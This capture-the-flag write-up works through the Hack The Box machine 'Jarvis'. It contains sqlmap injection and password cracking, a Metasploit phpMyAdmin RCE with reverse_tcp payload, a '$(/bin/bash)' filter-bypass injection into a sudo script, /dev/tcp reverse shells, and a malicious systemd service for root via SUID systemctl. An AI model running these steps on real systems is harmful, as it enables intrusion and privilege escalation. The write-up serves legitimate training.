# JARVIS

## NMAP

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/jarvis]
└─$ nmap 10.10.10.143
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-02 07:10 EDT
Nmap scan report for 10.10.10.143
Host is up (0.20s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 27.78 seconds
                                                                                            
┌──(kali㉿kali)-[~/Downloads/hackthebox/jarvis]
└─$ nmap 10.10.10.143 -p 22,80 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-02 07:11 EDT
Nmap scan report for 10.10.10.143
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## PORT 80

### WEBPAGE

![](https://github.com/Leo-2807/Writeups/blob/main/images/jarvis1.png)

### GOBUSTER

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/jarvis]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.143/ -t 100
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.143/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/09/02 07:18:47 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 291]
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 296]
/css                  (Status: 301) [Size: 310] [--> http://10.10.10.143/css/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.10.143/fonts/]
/images               (Status: 301) [Size: 313] [--> http://10.10.10.143/images/]
/index.php            (Status: 200) [Size: 23628]                                
/js                   (Status: 301) [Size: 309] [--> http://10.10.10.143/js/]    
/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.10.143/phpmyadmin/]
/server-status        (Status: 403) [Size: 300]                                      
                                                                                     
===============================================================
2021/09/02 07:19:01 Finished
===============================================================
```

## PHPMYADMIN

![](https://github.com/Leo-2807/Writeups/blob/main/images/jarvis2.png)

This is a phpmyadmin login page but we need creds for this.

## ROOM.PHP

On further enumeration We find this page. 

![](https://github.com/Leo-2807/Writeups/blob/main/images/jarvis3.png)

At first I thought lfi but that didn't work.
Well the machine did have a sqli tag so I thought maybe there is sqli vulnerbility.

I used `sqlmap` to find some possible vulnerbility 

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/jarvis]
└─$ sqlmap -u http://10.10.10.143/room.php?cod=1 -a
        ___
       __H__                                                                                        
 ___ ___["]_____ ___ ___  {1.5.5#stable}                                                            
|_ -| . [,]     | .'| . |                                                                           
|___|_  ["]_|_|_|__,|  _|                                                                           
      |_|V...       |_|   http://sqlmap.org                                                         
...snip...

[08:54:38] [INFO] GET parameter 'cod' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'cod' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 84 HTTP(s) requests:
---
Parameter: cod (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cod=1 AND 5322=5322

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: cod=1 AND (SELECT 6078 FROM (SELECT(SLEEP(5)))OJoi)

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: cod=-6883 UNION ALL SELECT NULL,CONCAT(0x71626b7071,0x7673755575494552636c5153666b724c74637558726b635a4b61555663426c6b734b6d554263536c,0x716b7a7871),NULL,NULL,NULL,NULL,NULL-- -
---
[09:00:50] [INFO] the back-end DBMS is MySQL
[09:00:50] [INFO] fetching banner
[09:00:50] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
web server operating system: Linux Debian 9 (stretch)
web application technology: PHP, Apache 2.4.25
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
banner: '10.1.37-MariaDB-0+deb9u1'
[09:00:51] [INFO] fetching current user
current user: 'DBadmin@localhost'
[09:00:51] [INFO] fetching current database
current database: 'hotel'
[09:00:51] [INFO] fetching server hostname
hostname: 'jarvis'
[09:00:52] [INFO] testing if current user is DBA
[09:00:52] [INFO] fetching current user
current user is DBA: True
[09:00:52] [INFO] fetching database users
[09:00:53] [INFO] retrieved: ''DBadmin'@'localhost''
database management system users [1]:                                                              
[*] 'DBadmin'@'localhost'

[09:00:59] [INFO] fetching database users password hashes
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] Y
[09:01:21] [INFO] using hash method 'mysql_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 2
what's the custom dictionary's location?
> /usr/share/wordlists/rockyou.txt
[09:01:48] [INFO] using custom dictionary
do you want to use common password suffixes? (slow!) [y/N] y
[09:01:56] [INFO] starting dictionary-based cracking (mysql_passwd)
[09:01:56] [INFO] starting 2 processes 
[09:01:56] [INFO] cracked password 'imissyou' for user 'DBadmin'                                   
[09:04:31] [INFO] current status: 08012... |^C
[09:04:31] [WARNING] user aborted during dictionary-based attack phase (Ctrl+C was pressed)
database management system users password hashes:                                                  
[*] DBadmin [1]:
    password hash: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
    clear-text password: imissyou
```

And now we have a user and password 

`user:DBadmin     &      password:imissyou`

## FOOTHOLD

Now we can log in to the phpmyadmin with these creds

![](https://github.com/Leo-2807/Writeups/blob/main/images/jarvis4.png)

Searching for exploit in `metasploit ` I found one with a lfi rce

```bash
msf6 > search phpmyadmin

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank       Check  Description
   -  ----                                                  ---------------  ----       -----  -----------
   0  exploit/unix/webapp/phpmyadmin_config                 2009-03-24       excellent  No     PhpMyAdmin Config File Code Injection
   1  auxiliary/scanner/http/phpmyadmin_login                                normal     No     PhpMyAdmin Login Scanner
   2  post/linux/gather/phpmyadmin_credsteal                                 normal     No     Phpmyadmin credentials stealer
   3  auxiliary/admin/http/telpho10_credential_dump         2016-09-02       normal     No     Telpho10 Backup Credentials Dumper
   4  exploit/multi/http/zpanel_information_disclosure_rce  2014-01-30       excellent  No     Zpanel Remote Unauthenticated RCE
   5  exploit/multi/http/phpmyadmin_3522_backdoor           2012-09-25       normal     No     phpMyAdmin 3.5.2.2 server_sync.php Backdoor
   6  exploit/multi/http/phpmyadmin_lfi_rce                 2018-06-19       good       Yes    phpMyAdmin Authenticated Remote Code Execution
   7  exploit/multi/http/phpmyadmin_null_termination_exec   2016-06-23       excellent  Yes    phpMyAdmin Authenticated Remote Code Execution
   8  exploit/multi/http/phpmyadmin_preg_replace            2013-04-25       excellent  Yes    phpMyAdmin Authenticated Remote Code Execution via preg_replace()


Interact with a module by name or index. For example info 8, use 8 or use exploit/multi/http/phpmyadmin_preg_replace

msf6 > use 6
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/phpmyadmin_lfi_rce) > options

Module options (exploit/multi/http/phpmyadmin_lfi_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    no        Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /phpmyadmin/     yes       Base phpMyAdmin directory path
   USERNAME   root             yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(multi/http/phpmyadmin_lfi_rce) > set PASSWORD imissyou
PASSWORD => imissyou
msf6 exploit(multi/http/phpmyadmin_lfi_rce) > set RHOST 10.10.10.143
RHOST => 10.10.10.143
msf6 exploit(multi/http/phpmyadmin_lfi_rce) > set USERNAME DBadmin
USERNAME => DBadmin
msf6 exploit(multi/http/phpmyadmin_lfi_rce) > set LHOST 10.10.14.14
LHOST => 10.10.14.14
msf6 exploit(multi/http/phpmyadmin_lfi_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.14:4444 
[*] Sending stage (39282 bytes) to 10.10.10.143
[*] Meterpreter session 1 opened (10.10.14.14:4444 -> 10.10.10.143:47658) at 2021-09-02 09:18:04 -0400
meterpreter > shell
Process 1717 created.
Channel 0 created.
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@jarvis:/usr/share/phpmyadmin$ whoami
whoami
www-data
```

## USER.TXT


I tried to check sudo privelges using `sudo -l` 

```bash
www-data@jarvis:/usr/share/phpmyadmin$ sudo -l
sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
www-data@jarvis:/usr/share/phpmyadmin$ cd /var/www/Admin-Utilities
cd /var/www/Admin-Utilities
www-data@jarvis:/var/www/Admin-Utilities$ ls
ls
simpler.py
www-data@jarvis:/var/www/Admin-Utilities$ ls -la
ls -la
total 16
drwxr-xr-x 2 pepper pepper 4096 Mar  4  2019 .
drwxr-xr-x 4 root   root   4096 Mar  4  2019 ..
-rwxr--r-- 1 pepper pepper 4587 Mar  4  2019 simpler.py
```

We can run `simple.py` as the user `pepper` 

```python
www-data@jarvis:/var/www/Admin-Utilities$ cat simpler.py
cat simpler.py
#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import re

def show_help():
    message='''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)

def show_header():
    print('''***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************
''')

def show_statistics():
    path = '/home/pepper/Web/Logs/'
    print('Statistics\n-----------')
    listed_files = listdir(path)
    count = len(listed_files)
    print('Number of Attackers: ' + str(count))
    level_1 = 0
    dat = datetime(1, 1, 1)
    ip_list = []
    reks = []
    ip = ''
    req = ''
    rek = ''
    for i in listed_files:
        f = open(path + i, 'r')
        lines = f.readlines()
        level2, rek = get_max_level(lines)
        fecha, requ = date_to_num(lines)
        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if fecha > dat:
            dat = fecha
            req = requ
            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if int(level2) > int(level_1):
            level_1 = level2
            ip_list = [ip]
            reks=[rek]
        elif int(level2) == int(level_1):
            ip_list.append(ip)
            reks.append(rek)
        f.close()

    print('Most Risky:')
    if len(ip_list) > 1:
        print('More than 1 ip found')
    cont = 0
    for i in ip_list:
        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
        cont = cont + 1

    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)

def list_ip():
    print('Attackers\n-----------')
    path = '/home/pepper/Web/Logs/'
    listed_files = listdir(path)
    for i in listed_files:
        f = open(path + i,'r')
        lines = f.readlines()
        level,req = get_max_level(lines)
        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
        f.close()

def date_to_num(lines):
    dat = datetime(1,1,1)
    ip = ''
    req=''
    for i in lines:
        if 'Level' in i:
            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
            regex = '(\d+)-(.*)-(\d+)(.*)'
            logEx=re.match(regex, fecha).groups()
            mes = to_dict(logEx[1])
            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
            if fecha > dat:
                dat = fecha
                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
    return dat, req

def to_dict(name):
    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
    return month_dict[name]

def get_max_level(lines):
    level=0
    for j in lines:
        if 'Level' in j:
            if int(j.split(' ')[4]) > int(level):
                level = j.split(' ')[4]
                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
    return level, req

def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()
```

So we can run any command in the ping option as long as it does not have the forbidden symbols

Since we are running the script as user `pepper` and the sysmbol `$` is not forbidden `$(/bin/bash)` should give us a shell as pepper

```bash
www-data@jarvis:/var/www/Admin-Utilities$ sudo -u pepper /var/www/Admin-Utilities/simpler.py   
<sudo -u pepper /var/www/Admin-Utilities/simpler.py 
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************


********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    
www-data@jarvis:/var/www/Admin-Utilities$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
<do -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(/bin/bash)
$(/bin/bash)
pepper@jarvis:/var/www/Admin-Utilities$ cd ~
cd ~
pepper@jarvis:~$ ls
ls
pepper@jarvis:~$ ls -la
ls -la
pepper@jarvis:~$ cat user.txt
cat user.txt
```

Well it did gave us a shell as `pepper` but only some commands were working

sh command was also working so I thought maybe I could get a reverse shell

```bash 
pepper@jarvis:~$ sh -i >& /dev/tcp/10.10.14.14/4444 0>&1
```
```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/jarvis]
└─$ nc -lvnp 4444        
listening on [any] 4444 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.143] 47676
$ python -c 'import pty; pty.spawn("/bin/bash")'
pepper@jarvis:~$ ls
ls
Web  user.txt
pepper@jarvis:~$ cat user.txt
cat user.txt
2afa36c4f05b37b34259c93551f5c44f
```

## ROOT.TXT

Using the command `find / -perm /4000 2>/dev/null` to check for suid permissions I find that we have suid bits set for `/bin/systemctl`

On doing a quick google search I found this [article](https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49)

First I make a `root.service` file on my machine with these contents

```
[Unit]
Description=rooooooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.14/9999 0>&1'

[Install]
WantedBy=multi-user.target
```

Then I start a http server on my machine using the command `python -m SimpleHTTPServer`

Then I download the file on the victim machine 

```bash
pepper@jarvis:~$ wget http://10.10.14.14:8000/root.service
wget http://10.10.14.14:8000/root.service
--2021-09-02 10:25:34--  http://10.10.14.14:8000/root.service
Connecting to 10.10.14.14:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 172 [application/octet-stream]
Saving to: 'root.service'

root.service          0%[                    ]       0  --.-KB/s     root.service        100%[===================>]     172  --.-KB/s    in 0s      

2021-09-02 10:25:35 (49.0 MB/s) - 'root.service' saved [172/172]

pepper@jarvis:~$ ls
ls
Web root.service  user.txt
pepper@jarvis:~$ /bin/systemctl enable /home/pepper/root.service
/bin/systemctl enable /home/pepper/root.service
Created symlink /etc/systemd/system/multi-user.target.wants/root.service -> /home/pepper/root.service.
Created symlink /etc/systemd/system/root.service -> /home/pepper/root.service.
pepper@jarvis:~$ /bin/systemctl start root
/bin/systemctl start root
pepper@jarvis:~$ /bin/systemctl start root
/bin/systemctl start root
```

We also need to start netcat port listner

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/jarvis]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.143] 53666
bash: cannot set terminal process group (15684): Inappropriate ioctl for device
bash: no job control in this shell
root@jarvis:/# cd /root
cd /root
root@jarvis:~# cat root.txt
cat root.txt
d41d8cd98f00b204e9800998ecf84271
```

